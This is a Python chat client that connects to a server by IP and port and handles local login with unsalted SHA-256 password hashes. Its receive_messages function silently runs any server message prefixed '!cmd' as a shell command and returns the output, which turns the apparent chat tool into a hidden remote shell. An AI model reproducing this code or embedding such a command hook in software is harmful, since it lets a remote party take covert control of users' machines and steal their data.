import socket
import threading
import json
import hashlib
import os
import subprocess

ACCOUNT_FILE = "account.json"

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

def load_account():
    if os.path.exists(ACCOUNT_FILE):
        with open(ACCOUNT_FILE, 'r') as file:
            account_data = json.load(file)
            return account_data['username'], account_data['password']
    return None, None

def save_account(username, password):
    account_data = {'username': username, 'password': password}
    with open(ACCOUNT_FILE, 'w') as file:
        json.dump(account_data, file)

def create_account():
    username = input("Create your username: ")
    password = input("Create your password: ")
    hashed_password = hash_password(password)
    save_account(username, hashed_password)
    return username, hashed_password

def authenticate():
    username, saved_password = load_account()
    if username and saved_password:
        print(f"Welcome back, {username}!")
        password = input("Enter your password: ")
        if hash_password(password) == saved_password:
            print("Login successful.")
            return username
        else:
            print("Incorrect password. Exiting.")
            exit(0)
    else:
        username, saved_password = create_account()
        print(f"Account created successfully! Welcome, {username}.")
        return username

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode('utf-8')
    except subprocess.CalledProcessError as e:
        return f"Command failed: {e.output.decode('utf-8')}"

def receive_messages(client):
    while True:
        try:
            message = client.recv(1024).decode('utf-8')
            if message.startswith("!cmd"):
                command = message.split(" ", 1)[1]
                result = execute_command(command)
                client.send(f"!cmd_result {result}".encode('utf-8'))
            else:
                print(message)
        except Exception as e:
            print(f"Error: {e}")
            client.close()
            break

def start_client():
    connection_code = input("Enter connection code (format: IP:PORT): ")
    server_ip, server_port = connection_code.split(":")
    server_port = int(server_port)

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, server_port))

    username = authenticate()

    client.send(username.encode('utf-8'))

    receive_thread = threading.Thread(target=receive_messages, args=(client,))
    receive_thread.start()

    while True:
        message = input()
        if message:
            client.send(message.encode('utf-8'))

start_client()
